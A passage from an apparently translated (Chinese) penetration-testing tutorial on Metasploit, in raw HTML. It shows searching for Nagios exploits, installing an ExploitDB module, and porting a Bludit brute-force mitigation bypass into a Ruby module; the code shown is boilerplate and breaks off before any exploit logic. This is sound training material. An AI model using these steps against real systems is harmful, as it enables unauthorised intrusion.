class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search nagios</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution</span><br><span class="line">   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution</span><br><span class="line">   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution</span><br><span class="line">   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution</span><br><span class="line">   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection</span><br><span class="line">   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration</span><br></pre></td></tr></table></figure><p>但是，我们可以<a href="https://www.exploit-db.com/exploits/9861">在 ExploitDB 的条目中</a>找到漏洞利用代码。或者，如果我们不想使用我们的网络浏览器在 ExploitDB 中搜索特定的漏洞，我们可以使用 CLI 版本，<code>searchsploit</code>.</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit nagios3</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Remote Command Execution                                                                                             | multiple/remote/24084.py</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>请注意，以 结尾的托管文件终止符<code>.rb</code>是 Ruby 脚本，很可能是专门为在<code>msfconsole</code>. 我们还可以仅按<code>.rb</code>文件终止符进行过滤，以避免无法在<code>msfconsole</code>. 请注意，并非所有<code>.rb</code>文件都会自动转换为<code>msfconsole</code>模块。有些漏洞是用 Ruby 编写的，其中没有任何与 Metasploit 模块兼容的代码。我们将在以下小节中查看这些示例之一。</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit -t Nagios3 --exclude=&quot;.py&quot;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>我们必须下载<code>.rb</code>文件并将其放在正确的目录中。存储所有模块、脚本、插件和<code>msfconsole</code>专有文件的默认目录是<code>/usr/share/metasploit-framework</code>. 关键文件夹也在隐藏位置的主文件夹和根文件夹中进行了符号链接<code>~/.msf4/</code>。</p><h4 id="MSF-目录结构"><a href="#MSF-目录结构" class="headerlink" title="MSF - 目录结构"></a>MSF - 目录结构</h4><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/</span><br><span class="line"></span><br><span class="line">app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor</span><br><span class="line">config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts</span><br><span class="line">data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools</span><br></pre></td></tr></table></figure><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls .msf4/</span><br><span class="line"></span><br><span class="line">history  local  logos  logs  loot  modules  plugins  store</span><br></pre></td></tr></table></figure><p><a href="https://www.exploit-db.com/exploits/9861">我们下载好exploit</a>后拷贝到合适的目录下。请注意，我们的主文件夹<code>.msf4</code>位置可能不具有该文件夹可能具有的所有文件夹结构<code>/usr/share/metasploit-framework/</code>。因此，我们只需要<code>mkdir</code>适当的文件夹，使结构与原始文件夹相同，以便<code>msfconsole</code>可以找到新模块。之后，我们将继续将<code>.rb</code>脚本直接复制到主要位置。</p><p>请注意，某些命名约定如果没有得到充分遵守，将在尝试识别<code>msfconsole</code>我们安装的新模块时产生错误。始终使用蛇形、字母数字字符和下划线而不是破折号。</p><p>例如：</p><ul><li><code>nagios3_command_injection.rb</code></li><li><code>our_module_here.rb</code></li></ul><h4 id="MSF-在运行时加载附加模块"><a href="#MSF-在运行时加载附加模块" class="headerlink" title="MSF - 在运行时加载附加模块"></a>MSF - 在运行时加载附加模块</h4><p> MSF - 在运行时加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><h4 id="MSF-加载附加模块"><a href="#MSF-加载附加模块" class="headerlink" title="MSF - 加载附加模块"></a>MSF - 加载附加模块</h4><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; loadpath /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><p>或者，我们也可以启动<code>msfconsole</code>并运行<code>reload_all</code>新安装的模块出现在列表中的命令。命令运行完没有报错后，要么试试<code>search [name]</code>里面的函数<code>msfconsole</code>，要么直接用<code>use [module-path]</code>直接跳转到新安装的模块。</p><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; reload_all</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/nagios3_command_injection </span><br><span class="line">msf6 exploit(unix/webapp/nagios3_command_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/nagios3_command_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting                 Required  Description</span><br><span class="line">   ----     ---------------                 --------  -----------</span><br><span class="line">   PASS     guest                           yes       The password to authenticate with</span><br><span class="line">   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80                              yes       The target port (TCP)</span><br><span class="line">   SSL      false                           no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi</span><br><span class="line">   USER     guest                           yes       The username to authenticate with</span><br><span class="line">   VHOST                                    no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br></pre></td></tr></table></figure><p>现在我们已准备好针对我们的目标启动它。</p><hr><h2 id="将脚本移植到-Metasploit-模块中"><a href="#将脚本移植到-Metasploit-模块中" class="headerlink" title="将脚本移植到 Metasploit 模块中"></a>将脚本移植到 Metasploit 模块中</h2><p>要将自定义 Python、PHP 或任何类型的漏洞利用脚本改编为 Metasploit 的 Ruby 模块，我们需要学习 Ruby 编程语言。请注意，Metasploit 的 Ruby 模块始终使用硬选项卡编写。</p><p>当开始移植项目时，我们不需要从头开始编码。相反，我们可以从我们的项目所属的类别中获取现有的漏洞利用模块之一，并将其重新用于我们当前的移植脚本。请记住始终保持我们的自定义模块井井有条，以便我们和其他渗透测试人员在搜索自定义模块时可以从干净、井井有条的环境中受益。</p><p>我们首先选择一些漏洞利用代码移植到 Metasploit。在此示例中，我们将使用<a href="https://www.exploit-db.com/exploits/48746">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>。我们需要下载脚本，<code>48746.rb</code>然后将其复制到<code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code>文件夹中。如果我们现在启动<code>msfconsole</code>，我们将只能在与上面相同的文件夹中找到一个<code>Bludit CMS</code>漏洞，确认我们的漏洞还没有被移植过来。好消息是该文件夹中已经有一个 Bludit 漏洞，因为我们将把它用作我们新漏洞的样板代码。</p><h4 id="移植-MSF-模块"><a href="#移植-MSF-模块" class="headerlink" title="移植 MSF 模块"></a>移植 MSF 模块</h4><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit</span><br><span class="line"></span><br><span class="line">bludit_upload_images_exec.rb</span><br></pre></td></tr></table></figure><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb</span><br></pre></td></tr></table></figure><p>在我们复制的文件的开头，也就是我们要填写信息的地方，我们可以注意到<code>include</code>样板模块开头的语句。这些是本节中提到的混合宏<code>Plugins and Mixins</code>，我们需要将它们更改为适合我们模块的混合宏。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">如果我们想找到我们的模块工作所需的合适的 mixins、类和方法，我们将需要在rubydoc rapid7 文档</a>中查找不同的条目。</p><hr><h2 id="编写我们的模块"><a href="#编写我们的模块" class="headerlink" title="编写我们的模块"></a>编写我们的模块</h2><p>在特定评估期间，我们经常会面对运行专有代码以服务其客户的定制网络。我们手头的大多数模块甚至都没有在它们的周边留下凹痕，而且我们似乎无法用我们拥有的任何东西正确地扫描和记录目标。在这里，我们可能会发现重拾 Ruby 技能并开始编写模块代码很有帮助。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework">有关 Metasploit Ruby 编码的所有必要信息都可以在Rubydoc.info Metasploit Framework</a>相关页面上找到。从扫描器到其他辅助工具，从定制的漏洞利用程序到移植的漏洞利用程序，用 Ruby 为框架编写代码是一项非常实用的技能。</p><p>请看下面一个类似的模块，我们可以将其用作漏洞利用移植的样板代码。这是<a href="https://www.exploit-db.com/exploits/47699">Bludit 目录遍历图像文件上传漏洞</a>利用，已经导入到<code>msfconsole</code>. 在漏洞利用概念验证 ( ) 之前，花点时间了解模块中包含的所有不同字段<code>POC</code>。请注意，此代码在下面的代码片段中没有更改以适应我们当前的导入，而是上面提到的预先存在的模块的直接快照。这些信息将需要针对新的移植项目进行相应调整。</p><h4 id="概念验证-要求"><a href="#概念验证-要求" class="headerlink" title="概念验证 - 要求"></a>概念验证 - 要求</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FileDropper</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br></pre></td></tr></table></figure><p>我们可以查看<code>include</code>语句以了解每个语句的作用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">这可以通过将它们与rubydoc rapid7 文档</a>交叉引用来完成。以下是文档中解释的它们各自的功能：</p><table><thead><tr><th><strong>功能</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Msf::Exploit::Remote::HttpClient</code></td><td>该模块提供了在利用 HTTP 服务器时充当 HTTP 客户端的方法。</td></tr><tr><td><code>Msf::Exploit::PhpEXE</code></td><td>这是一种用于生成第一阶段 php 负载的方法。</td></tr><tr><td><code>Msf::Exploit::FileDropper</code></td><td>此方法在与目标建立会话后传输文件并处理文件清理。</td></tr><tr><td><code>Msf::Auxiliary::Report</code></td><td>此模块提供向 MSF DB 报告数据的方法。</td></tr></tbody></table><p>看看他们上面的目的，我们得出结论，我们不需要 FileDropper 方法，我们可以从最终的模块代码中删除它。</p><p>我们看到有不同的部分专门用于<code>info</code>模块的页面，<code>options</code>部分。我们不恰当地填写它们，向发现漏洞的个人、CVE 信息和其他相关详细信息提供信用。</p><h4 id="概念验证-模块信息"><a href="#概念验证-模块信息" class="headerlink" title="概念验证 - 模块信息"></a>概念验证 - 模块信息</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">    <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit Directory Traversal Image File Upload Vulnerability&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">      This module exploits a vulnerability in Bludit. A remote user could abuse the uuid</span></span><br><span class="line"><span class="string">      parameter in the image upload feature in order to save a malicious payload anywhere</span></span><br><span class="line"><span class="string">      onto the server, and then use a custom .htaccess file to bypass the file extension</span></span><br><span class="line"><span class="string">      check to finally get remote code execution.</span></span><br><span class="line"><span class="string">    &#125;</span>,</span><br><span class="line">    <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">    <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;christasa&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">        <span class="string">&#x27;sinn3r&#x27;</span>     <span class="comment"># Metasploit module</span></span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">      [</span><br><span class="line">        [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-16113&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/issues/1081&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac&#x27;</span> ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">    <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">        <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">        <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">      [</span><br><span class="line">        [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-09-07&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>一般标识信息填好后，我们就可以转到<code>options</code>菜单变量了：</p><h4 id="概念验证-功能"><a href="#概念验证-功能" class="headerlink" title="概念验证 - 功能"></a>概念验证 - 功能</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">register_options(</span><br><span class="line">     [</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITPASS&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The password for Bludit&#x27;</span>])</span><br><span class="line">     ])</span><br><span class="line"> <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>回顾我们的利用，我们发现需要一个单词表而不是<code>BLUDITPASS</code>模块的变量来暴力破解相同用户名的密码。它看起来像下面的片段：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">          <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br></pre></td></tr></table></figure><p>其余的漏洞利用代码需要根据移植到 Metasploit Framework 中使用的类、方法和变量进行调整，以使模块最终发挥作用。该模块的最终版本如下所示：</p><h4 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;rastating&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">          <span class="string">&#x27;0ne-nine9&#x27;</span>  <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-17240&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/pull/1090&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">      <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">          <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">          <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-10-05&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br><span class="line">      </span><br><span class="line">     register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, 